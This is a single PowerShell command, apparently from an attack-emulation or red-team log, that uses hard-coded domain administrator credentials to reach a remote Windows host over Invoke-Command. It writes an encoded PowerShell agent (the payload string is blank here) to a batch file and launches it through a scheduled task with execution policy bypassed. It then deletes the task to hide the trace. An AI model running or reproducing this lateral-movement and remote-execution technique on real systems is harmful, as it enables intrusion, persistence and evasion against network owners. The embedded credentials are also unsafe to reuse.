command: $remoteComputer = "192.168.57.11"; $username = 'it\Administrator'; $password = 'Admin@pass'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; $scriptContent =' powershell -e  '; Invoke-Command -ComputerName $remoteComputer -Credential $credential -ScriptBlock { param ($content) $filePath ="C:\Scripts\agent.bat"; $content | Out-File -FilePath $filePath -Encoding ASCII } -ArgumentList $scriptContent; $scriptContent = ' cmd /c "C:\Scripts\agent.bat" '; Invoke-Command -ComputerName $remoteComputer -Credential $credential -ScriptBlock { param ($content) $filePath = "C:\Scripts\runAgent.ps1"; $content | Out-File -FilePath $filePath -Encoding ASCII } -ArgumentList $scriptContent; Invoke-Command -ComputerName $remoteComputer -Credential $credential -ScriptBlock { schtasks /create /tn "RunPowerShellScriptvv1" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\runAgent.ps1" /sc once /st 10:00; schtasks /run /tn "RunPowerShellScriptvv1"; Start-Sleep -Seconds 10; schtasks /delete /tn "RunPowerShellScriptvv1" /f };
